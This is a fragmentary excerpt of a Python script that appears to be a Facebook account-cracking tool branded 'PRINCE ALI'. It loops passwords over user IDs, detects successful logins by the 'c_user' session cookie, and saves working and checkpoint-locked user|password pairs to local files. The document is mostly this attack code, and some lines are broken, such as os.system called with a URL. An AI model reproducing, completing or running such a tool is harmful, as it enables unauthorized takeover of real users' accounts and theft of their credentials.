...
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;92m➣ \033[1;92mWHATSAPP   :            PRINCE ALI
...
a=requests.get("https://www.facebook.com/XxxxxxxxxxxXxxxxxxxx786?mibextid=ZbWKwL").text
...
if key2 in b:
    ...
    os.system('https://www.facebook.com/XxxxxxxxxxxXxxxxxxxx786?mibextid=ZbWKwL')
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;93mPress enter to back PRINCE ALI ")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;93m[PRINCEALI-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [PRINCE ALI-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('PRINCE ALI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [PRINCE ALI-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('PRINCE ALI_CP.txt' , 'a').write('%s\n' % wrt)
